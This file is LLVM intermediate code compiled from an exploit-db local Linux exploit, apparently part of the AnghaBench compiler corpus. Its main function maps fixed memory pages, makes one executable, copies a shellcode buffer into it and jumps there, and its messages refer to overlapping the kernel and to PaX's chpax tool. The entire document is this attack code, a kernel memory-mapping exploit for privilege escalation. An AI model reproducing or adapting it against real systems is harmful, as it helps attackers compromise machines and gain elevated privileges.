; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_29446.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_29446.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SIGBUS = common dso_local global i32 0, align 4
@mouarf = common dso_local global i32 0, align 4
@MAP1_BASE = common dso_local global i64 0, align 8
@PAGE_SIZE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_GROWSDOWN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [16 x i8] c"mmap map1 base\0A\00", align 1
@.str.1 = private unnamed_addr constant [17 x i8] c"mmap 0x0 failed\0A\00", align 1
@PROT_EXEC = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [19 x i8] c"mprotect map1 base\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [33 x i8] c"run chpax -m on this executable\0A\00", align 1
@SEGMEXEC_TASK_SIZE = common dso_local global i32 0, align 4
@ucode = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [26 x i8] c"--> about to fault on %X\0A\00", align 1
@.str.5 = private unnamed_addr constant [35 x i8] c"Overlaping the kernel by %d pages\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [27 x i8] c"Calling munmap ... %X, %x\0A\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c"munmap\00", align 1
@.str.8 = private unnamed_addr constant [18 x i8] c"PID:%d, sleeping\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca void (...)*, align 8
  store i32 0, i32* %1, align 4
  store i32 1, i32* %2, align 4
  %4 = load i32, i32* @SIGBUS, align 4
  %5 = load i32, i32* @mouarf, align 4
  %6 = call i32 @signal(i32 %4, i32 %5)
  %7 = load i64, i64* @MAP1_BASE, align 8
  %8 = inttoptr i64 %7 to i8*
  %9 = load i32, i32* @PAGE_SIZE, align 4
  %10 = load i32, i32* @PROT_READ, align 4
  %11 = load i32, i32* @PROT_WRITE, align 4
  %12 = or i32 %10, %11
  %13 = load i32, i32* @MAP_FIXED, align 4
  %14 = load i32, i32* @MAP_ANONYMOUS, align 4
  %15 = or i32 %13, %14
  %16 = load i32, i32* @MAP_PRIVATE, align 4
  %17 = or i32 %15, %16
  %18 = load i32, i32* @MAP_GROWSDOWN, align 4
  %19 = or i32 %17, %18
  %20 = call i8* @mmap(i8* %8, i32 %9, i32 %12, i32 %19, i32 0, i32 0)
  %21 = icmp eq i8* %20, inttoptr (i64 -1 to i8*)
  br i1 %21, label %22, label %24

22:                                               ; preds = %0
  %23 = call i32 @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %93

24:                                               ; preds = %0
  %25 = load i32, i32* @PAGE_SIZE, align 4
  %26 = load i32, i32* @PROT_READ, align 4
  %27 = load i32, i32* @PROT_WRITE, align 4
  %28 = or i32 %26, %27
  %29 = load i32, i32* @MAP_FIXED, align 4
  %30 = load i32, i32* @MAP_ANONYMOUS, align 4
  %31 = or i32 %29, %30
  %32 = load i32, i32* @MAP_PRIVATE, align 4
  %33 = or i32 %31, %32
  %34 = load i32, i32* @MAP_GROWSDOWN, align 4
  %35 = or i32 %33, %34
  %36 = call i8* @mmap(i8* null, i32 %25, i32 %28, i32 %35, i32 0, i32 0)
  %37 = icmp eq i8* %36, inttoptr (i64 -1 to i8*)
  br i1 %37, label %38, label %40

38:                                               ; preds = %24
  %39 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %93

40:                                               ; preds = %24
  %41 = load i64, i64* @MAP1_BASE, align 8
  %42 = inttoptr i64 %41 to i8*
  %43 = load i32, i32* @PAGE_SIZE, align 4
  %44 = load i32, i32* @PROT_READ, align 4
  %45 = load i32, i32* @PROT_WRITE, align 4
  %46 = or i32 %44, %45
  %47 = load i32, i32* @PROT_EXEC, align 4
  %48 = or i32 %46, %47
  %49 = call i64 @mprotect(i8* %42, i32 %43, i32 %48)
  %50 = icmp slt i64 %49, 0
  br i1 %50, label %51, label %55

51:                                               ; preds = %40
  %52 = call i32 @perror(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  %53 = load i32, i32* @stderr, align 4
  %54 = call i32 @fprintf(i32 %53, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %93

55:                                               ; preds = %40
  %56 = load i32, i32* @SEGMEXEC_TASK_SIZE, align 4
  %57 = load i32, i32* @PAGE_SIZE, align 4
  %58 = load i32, i32* %2, align 4
  %59 = mul nsw i32 %57, %58
  %60 = sub nsw i32 %56, %59
  %61 = load i64, i64* @ucode, align 8
  %62 = add nsw i64 %61, 1
  %63 = inttoptr i64 %62 to i32*
  store i32 %60, i32* %63, align 4
  %64 = load i64, i64* @MAP1_BASE, align 8
  %65 = add nsw i64 %64, 600
  %66 = inttoptr i64 %65 to i8*
  %67 = load i64, i64* @ucode, align 8
  %68 = call i32 @memcpy(i8* %66, i64 %67, i32 20)
  %69 = load i64, i64* @MAP1_BASE, align 8
  %70 = inttoptr i64 %69 to i8*
  %71 = getelementptr i8, i8* %70, i64 600
  %72 = bitcast i8* %71 to void (...)*
  store void (...)* %72, void (...)** %3, align 8
  %73 = load i32, i32* @SEGMEXEC_TASK_SIZE, align 4
  %74 = load i32, i32* @PAGE_SIZE, align 4
  %75 = load i32, i32* %2, align 4
  %76 = mul nsw i32 %74, %75
  %77 = sub nsw i32 %73, %76
  %78 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0), i32 %77)
  %79 = load void (...)*, void (...)** %3, align 8
  call void (...) %79()
  %80 = load i32, i32* %2, align 4
  %81 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0), i32 %80)
  %82 = load i32, i32* @stdout, align 4
  %83 = call i32 @fflush(i32 %82)
  %84 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0), i32 8192, i32 4096)
  %85 = call i64 @munmap(i32 8192, i32 4096)
  %86 = icmp slt i64 %85, 0
  br i1 %86, label %87, label %89

87:                                               ; preds = %55
  %88 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  br label %89

89:                                               ; preds = %87, %55
  %90 = call i32 (...) @getpid()
  %91 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.8, i64 0, i64 0), i32 %90)
  %92 = call i32 @sleep(i32 2000)
  store i32 0, i32* %1, align 4
  br label %93

93:                                               ; preds = %89, %51, %38, %22
  %94 = load i32, i32* %1, align 4
  ret i32 %94
}

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i8* @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @mprotect(i8*, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @memcpy(i8*, i64, i32) #1

declare dso_local i32 @printf(i8*, i32, ...) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i64 @munmap(i32, i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
